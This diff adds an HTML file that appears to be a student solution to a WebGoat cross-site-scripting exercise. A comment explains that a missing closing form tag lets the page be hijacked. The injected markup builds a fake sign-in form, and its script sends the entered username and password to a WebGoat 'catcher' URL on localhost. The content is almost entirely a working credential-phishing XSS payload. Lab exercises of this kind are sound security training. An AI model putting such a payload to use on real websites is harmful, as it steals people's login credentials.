@@ -1,0 +1,42 @@
+</form>
+<!--
+The webpage has a missing </form> tag. Thus it is exploitable thru phishing with XSS
+-->
+</form>
+<form>
+	<h1>Sign in</h1>
+	<table>
+		<tr>
+			<th>Please sign in to your account</th>
+		</tr>
+		<tr>
+			<td>*Required Fields</td>
+		</tr>
+		<tr>
+			<td>
+				<b> *User Name: </b>
+			</td>
+			<td>
+				<input id="ece568username" name="username" type="TEXT" value>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<b> *Password: </b>
+			</td>
+			<td>
+				<input id="ece568password" name="password" type="TEXT" value>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<input type="submit" id="ece568submit" name="submit" value="login" onclick="phishing()">
+			</td>
+		</tr>
+	</table>
+	<script>function phishing() {
+			document.forms[0].action = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&user=" + document.forms[1].username.value + "&password=" + document.forms[1].password.value;
+			document.forms[0].submit();
+		}
+	</script>
+</form>
